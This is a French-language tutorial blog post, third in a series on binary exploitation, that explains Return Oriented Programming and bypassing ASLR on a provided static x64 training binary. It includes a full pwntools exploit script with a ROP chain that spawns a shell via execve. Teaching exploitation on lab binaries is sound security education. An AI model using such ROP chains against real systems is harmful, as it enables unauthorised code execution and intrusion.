---
author: "Laluka"
title: "PWN 3/4 : SaperliROPette !"
slug: "pwn_3of4_saperliropette"
date: 2018-05-09
description: "Introcution au Return Oriented Programming (ROP) et exemple pratique."
---

 > Petit ajout après la publication des articles :

 > Ces quatres articles ont donné lieu à une conférence d'introduction au pwn à la HitchHack 2018. Elle résume les 3 premiers articles mais rentre moins dans le détail. Si ce format vous convient mieux, les slides sont téléchargables [ici](/hacking/pwn_1of4_buffer_overflow/slides_conf_123_pwned.pdf) et la vidéo (francais uniquement) ici :

[![1, 2, 3, PWNED !](http://img.youtube.com/vi/hmt8M9YLwTg/0.jpg)](https://www.youtube.com/watch?v=hmt8M9YLwTg)

## Route du pwn, troisième  escale, bienvenue à bord !

Hier, le simple buffer overflow et le ret2libc, aujourd'hui, le ROP, ou Return Oriented Programming, et demain... Demain la conquête du monde !!!

<img class="img_med" src="/hacking/pwn_3of4_saperliropette/aboard.jpg" alt="aboard" >

Je vous ai laissé hier sur le ret2libc, qui, vu de loin, consiste à piocher dans la libc les fonctions qui nous intéressent. Sauf que cette attaque n'est pas possible dans le cas où le programme est compilé en statique, et difficilement faisable si l'ASLR est activé. Nous allons aujourd'hui découvrir le ROP qui nous permet de contourner ces protections.

Ca ressemble de plus en plus au jeu du chat et de la souris, so...\
Follow the leader cat !

## Précisions ASLR et PIC :
Avant de commencer, un petit retour sur ces protections parfois floues.

La configuration de l'ASLR est présente dans `/proc/sys/kernel/randomize_va_space`. Elle peut être à 0=désactivée, 1=activée (stack et heap), 2=activée (1 + data). La valeur 2 étant la nouvelle norme en cours d'adoption par les différents systèmes, déjà effective pour la plupart.

L'ASLR laisse donc toute une surface d'attaque non randomisée. Arriva donc ce qu'il devait arriver : des attaques utilisant les sections .data, .got, .plt, ...

Plus d'informations sur les différentes sections et la structure d'un ELF ici : [ELF_format](https://www.cs.stevens.edu/~jschauma/631A/elf.html)

L'ASLR ne suffisant pas, de nouvelles protections ont été mises en place : PIC / PIE (Position Indépendant Code / Exécutable). N'ayant pas encore suffisamment étudié son fonctionnement, je ne vais pas la présenter en détail. Mais l'idée est simple... Et si on randomisait.... TOUT ?!?!?!

Le ROP fonctionne avec un ASLR partiel ou total, mais est contré par cette dernière mesure...

Suite à la prochaine contre contre-mesure ! è.é

## Présentation de la technique :
Return... Oriented... Programming...

Hum hum... Programmer... Avec des... Return ? °^°'

On va profiter du fait que la section .text du programme soit toujours au même emplacement pour piocher plein de petits bouts de code appelés gadgets, et les assembler pour faire notre exploit. L'exploit est donc une suite d'adresses pointant sur de l'assembleur, donc dans l'absolu, on peut tout faire avec. La limite ? Les gadgets qui sont à notre disposition dans le programme...

Même si on "peut tout faire", la stratégie la plus commune reste de faire comme dans l'article 1 où l'on génère un shellcode qui, via un syscall, permet d'exécuter un programme de notre choix.

Une chose importante à relever ici : On a besoin de gadgets. Les gadgets, c'est du code qui ne bouge pas. Les librairies, ca bouge. Donc un programme qui se base sur les librairies aura bien moins de surface d'attaque qu'un programme compilé en statique, qui, lui, contient tout le code qu'il utilise. De même, plus un programme va être volumineux et faire des actions complexes, plus vous avez de chance qu'il y ait des gadgets intéressants. Capich ? Noice !

<img class="img_med" src="/hacking/pwn_3of4_saperliropette/noice.gif" alt="noice" >

Maintenant, abordons plus en détail les gadgets voulez-vous ?

Ils doivent tous répondre à un critère majeur : Se terminer par une instruction ret.

C'est ce critère qui rend l'attaque possible. En effet, lorsque l'on va contrôler le pointer d'instructions, on va faire en sorte que le programme exécute un premier gadget, que l'instruction ret finale indique la fin de l'exécution du premier gadget, et fasse revenir sur notre point de départ (la stack, qu'on vient d'overflow), mais une adresse plus loin. Cette adresse sera celle du second gadget et ainsi de suite.

Méfiance tout de même, si votre gadget se termine par un ret, mais contient des instructions qui modifient le flot d'exécution du programme, il risque de casser votre exploit. Donc pas de call, pas de leave, pas de "double ret", pas de bras, et surtout : pas de chocolat.

De nombreux outils permettent de lister les gadgets d'un exécutable, comme ROPgadget, Ropper, XRop, ...

## Elaboration de l'exploit :

Le binaire étudié est téléchargable [ici](/hacking/pwn_3of4_saperliropette/vuln) !

Avant toute chose, on regarde un peu à quoi on s'attaque : x64, compilé en statique, full ASLR. Ok !

<img class="img_full" src="/hacking/pwn_3of4_saperliropette/readelf.png" alt="readelf" >

Vous avez l'habitude maintenant, le classique :

Comprendre le fonctionnement du programme, trouver le point de crash, puis l'offset !

<img class="img_full" src="/hacking/pwn_3of4_saperliropette/pattern_create.png" alt="pattern_create" >

<img class="img_full" src="/hacking/pwn_3of4_saperliropette/crash.png" alt="crash" >

Ici encore, on voit que l'on crash sur un ret... Contrôlons-nous RSP ? Oui ! Offset ? 264 !

<img class="img_full" src="/hacking/pwn_3of4_saperliropette/pattern_search.png" alt="pattern_search" >

Petit rappel, ret a pour effet de placer ce vers quoi pointe RSP (donc le dernier élément de la stack), dans RIP. Nous avons donc RIP sous notre contrôle. Donc... RIP !

<img class="img_med" src="/hacking/pwn_3of4_saperliropette/dead_shell.jpg" alt="dead_shell" >

On utilise ensuite l'outil ropgadget qui nous offre une superbe ropchain faite à partir de notre programme vulnérable :

```shell
$ ropgadget --binary vuln --ropchain
```

L'output est long (verbeux), je n'en mets qu'une partie :

<img class="img_full" src="/hacking/pwn_3of4_saperliropette/ropgadget.png" alt="ropgadget" >

On en fait donc un fichier python, notre exploit est donc :


```python
#!/usr/bin/env python2

from pwn import *

# Setting up
context.log_level = "debug"

offset = 264
payload = "A" * offset
payload += p64(0x00000000004016a7)  # pop rsi ; ret
payload += p64(0x00000000006b41c0)  # @ .data
payload += p64(0x000000000043167d)  # pop rax ; ret
payload += '/bin//sh'
payload += p64(0x000000000045f661)  # mov qword ptr [rsi], rax ; ret
payload += p64(0x00000000004016a7)  # pop rsi ; ret
payload += p64(0x00000000006b41c8)  # @ .data + 8
payload += p64(0x000000000041918f)  # xor rax, rax ; ret
payload += p64(0x000000000045f661)  # mov qword ptr [rsi], rax ; ret
payload += p64(0x000000000040158b)  # pop rdi ; ret
payload += p64(0x00000000006b41c0)  # @ .data
payload += p64(0x00000000004016a7)  # pop rsi ; ret
payload += p64(0x00000000006b41c8)  # @ .data + 8
payload += p64(0x0000000000432ef5)  # pop rdx ; ret
payload += p64(0x00000000006b41c8)  # @ .data + 8
payload += p64(0x000000000041918f)  # xor rax, rax ; ret
payload += p64(0x0000000000453b50) * 59 # add rax, 1 ; ret
payload += p64(0x00000000004546e5)  # syscall ; ret

p = process("./vuln")
p.recv()
p.sendline(payload)
p.interactive()
p.close()
```

C'est pas beau toute cette automatisation ? Bon, ca ne marche pas à tous les coups, mais quand ca marche, le gain de temps est énorme, surtout en CTF... ;)

On va maintenant l'exploiter :

<img class="img_full" src="/hacking/pwn_3of4_saperliropette/run_exploit.png" alt="run_exploit" >

TADA, one more shell ! :D

Petit détail qui tue, on voit ici que $0 (le nom du programme exécuté) vaut "bash", alors que dans notre ropchain, on avait /bin//sh (qui est compris comme /bin/sh). Mais c'est normal, car sur ma machine, /bin/sh est un lien symbolique qui pointe vers bash ! Mon vrai sh est /usr/bin/sh.

> Mais... Ca ne concorde pas avec les exploits précédents ?!

Wouah ! Un qui suit ! Oui, en effet...\
Plus d'informations sur cette étrangeté sur l'article de coupaing Pixis : [sh_vs_bash](https://beta.hackndo.com/sh-vs-bash/)

C'est tout pour cette courte introduction au ROP, j'espère qu'elle vous a mindblown comme il se doit. Vous avez désormais quelques cartes en main : BOF / shellcode / ret2libc / ROP / cerveau / ...

C'est pourquoi notre prochaine rencontre se fera autour de l'analyse d'un programme un peu plus complet. Nous allons donc conclure cette série et...

Tout faire péterrrrr ! `\o/`

<img class="img_med" src="/hacking/pwn_3of4_saperliropette/like_a_boss.gif" alt="like_a_boss" >

A très vite pour plus de pwn !
